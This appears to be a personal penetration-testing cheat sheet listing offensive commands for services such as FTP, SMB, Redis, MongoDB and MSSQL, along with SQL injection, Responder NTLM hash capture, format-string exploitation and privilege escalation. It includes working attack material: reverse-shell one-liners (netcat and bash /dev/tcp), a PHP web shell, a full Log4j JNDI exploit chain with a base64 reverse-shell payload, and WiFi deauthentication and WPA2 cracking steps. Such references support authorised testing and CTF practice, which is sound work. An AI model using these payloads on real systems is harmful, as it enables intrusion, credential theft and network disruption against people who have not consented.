Cheat sheet for various tools.

# Network
## Nmap
- `-sV`: detect services & versions
- `-p-`: all range (big)
- `-p a-b`: range

## FTP
Port 21
### Anonymous
(Linux) ftp <host>, then anonymous
(Win) ftp -A <host>
### Commands
ls, get

## SMB
Port 445
### List shares
smbclient -L <host>

### Browse
cd, ls, get

## DB
### Redis
(DB inmemory), port 6379
#### Connect
redis-cli -h <host>

#### Commands
info, select <id> (select db index <id>), info keyspace
list keys: KEYS *
get <key>

### Microsoft SQL Server
Port 1433
mssqlclient.Py <user>:<pw>@<ip> [-windows-auth]

## SQLMap
### Help
- `sqlmap -h`
- `sqlmap --wizard`

### Scan
`sqlmap -u <url> --dbs`

## MongoDB
- `mongo --port $PORT`
- `mongo --port $PORT <default db> --eval <cmd>`

Typical cmds:
- `db.admin.find().forEach(printjson)`
- `db.admin.update({"_id":ObjectId("...")},{$set:{"...":"..."}})`

## GoBuster
Bruteforce webdirs
### WordLists
`SecLists/`
Classic :
Discovery/Web-Content/common.txt

Subdirs:
`gobuster dir --wordlist=<wl> --url=<host>`
Useful flags:
`-r`: follow redirect
`-k`: ignore non-verified certificates
`-b 404,302,...`: specify status codes as "negative"

Subdomains:
`gobuster vhost --append-domain --wordlist=<wl> --url=<domain>`


## SQL injection
### Basic login
--: skip rest of line
': end quote
... WHERE PASSWORD='PW<' OR 1=1-->' => always true

## Responder 
A LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication
NTLM: pre-Kerberos, challenge-based auth (assuming pw has been shared at some point, hashed then deleted)
### Setup
If needed, edit conf /usr/share/responder/Responder.conf
`responder -I <interface>`
Then trigger //<local_ip>/somefile on victim for it to send a NTLM

Then crack hashes
`john --format=netntlmv2 /usr/share/responder/logs --format=netntlmv2 `


# Reverse
## APK (Android)
**VSCode APKLab (all-in-one)**, else:
- adb: connect to phone
- apktool: decompile recompile etc
- jadx: decompiler
- jarsigner: resign


Decompile, open javasrc, com, etc: sources

getString(): get hex ID, grep in res/values/ (often strings.xml)

## Buffer Overflow
- Check Refresher
- gdb:
	- layout asm, layout regs
	- x /20x $rsp (stack)

## Format string
- use "AAAA%08x-%08x-%08x-..." to get indexes: STARTS AT 1
- check with "AAAA%i$p", i=index to display argument i
- write value v to address (flipped) AAAA, AAAA being argument i: "AAAA%(val-4)x%i$n" (%n int, %hn two bytes, %hhn one byte)
- link several writes: "AAAABBBB%(val1-8)x%1$hn%(val2-val1)x%2$hn", writing full address
- add shellcode: round modulo 4, put shellcode|format, and change indexes accordingly (+=len(rounded_shellcode/4))

# PHP
One liner shell (to index.php):
<?php system($_GET["cmd"]); ?>
Then goto <victim>/index.php?cmd=<cmd_to_run>


# PWN
## Hash
### Magic regex (Linux format hash)
`grep ./ -Erne '\$[^$ ]+(\$[^$ ]+)*\$[^ ]*'`

### John
(no trailing nothing, eventually \n)  
Careful when echo >, needs echo -n to avoid \n  
`john --wordlist=[WordList] --format=raw-sha256 hash.txt`
No user (start with $hash$salt)

## Docker Escape
Download (github) CDK_escape_container  
scp to host

whithout CDK:
```
ls /dev/sd*
capsh --print (capabilities)
find / -name "docker.sock" 2>/dev/null 
```

## Priv. Escalation
### Basics
Check
`whoami`, `groups`, `uname -a` (linux version, e.g. Dirty CoW)

### Check for open ports
Check for mysql or similar, run as root
`netstat -antup | grep "LISTENING"`

### Check for SUID
`find / -perm -u=s -type f 2>/dev/null` 

### PEASS
/usr/share/peass-ng/

Ex: dl from local http server

```
cd /usr/share/peass-ng/[linux/windows]
python -m http.server 80
(remote) wget <ip>/winPEASx64.exe -outfile <outfile>
(remote) wget <ip>/linpeas.sh
```
## Reverse shell

### Local
`nc -lnvp <port>`

### NC
- `nc <ip> <port> -e /bin/bash`
- `nc -c bash <ip> <port>`
#### Copy NC (win)
`nc64.exe`
- Copy to remote
- (remote) `cd ...; ./nc64.exe -e cmd.exe <my_ip> 443`

### No NC
`bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`

### Stabilize
#### Python
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

#### Other
`script /dev/null "/bin/bash"`

# Web
## XSS
## CSRF

## Log4j
Idea: use rogue LDAP server to recv Log4j call and deliver payload
Often: "remember" field

### Test
Use a beeceptor: `${jndi:ldap://bee.cep/test}`

### Craft payload
Custom "nc":
`echo 'bash -c bash -i >&/dev/tcp/$LOCIP/$LOCPORT 0>&1' | base64 `

### RogueJNDI
Build exploit class:
`java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,$b64EXPLOIT}|{base64,-d}|{bash,-i}" --hostname "$LOCIP" `

### Trigger LDAP call
Payload: `${jndi:ldap://$LOCIP:$LOCPORT/o=tomcat}`


# WiFI
## Airmon
- Check processes annoying
`sudo airmon-ng check`
- Kill
`sudo airmon-ng check kill`
- Setup monitor mode
`sudo airmon-ng start wlp2s0 [channel]`
- Stop monitor mode
`sudo airmon-ng stop wlp2s0mon`

## Airodump
- Listen around
`sudo airodump-ng wlp2s0mon`
- Listen for handshake
`sudo airodump-ng -c <channel> --bssid <AP ssid> -w psk wlp2s0mon`

## Aireplay
- Injection test
`sudo aireplay-ng -9 wlp2s0mon`
- Find target
`sudo aireplay-ng --fakeauth 0 wlp2s0mon`
- Force deauth (during listening or for annoying)
`sudo aireplay-ng -0 <nb deauth> -a <AP ssid> -c <target MAC> wlp2s0mon`

## Aircrack
- Bruteforce WPA2 PSK (local psk*.cap recordings)
`sudo aircrack-ng -w <path_to_wordlist> -b <AP ssid> psk*.cap`


# Misc. Useful
## Java
https://www.tutorialspoint.com/compile_java_online.php

## Tmux
- Ctrl+B + % : split vz
- Ctrl+B + " : split vz
- Ctrl+B + [ : scroll mode, q to quit
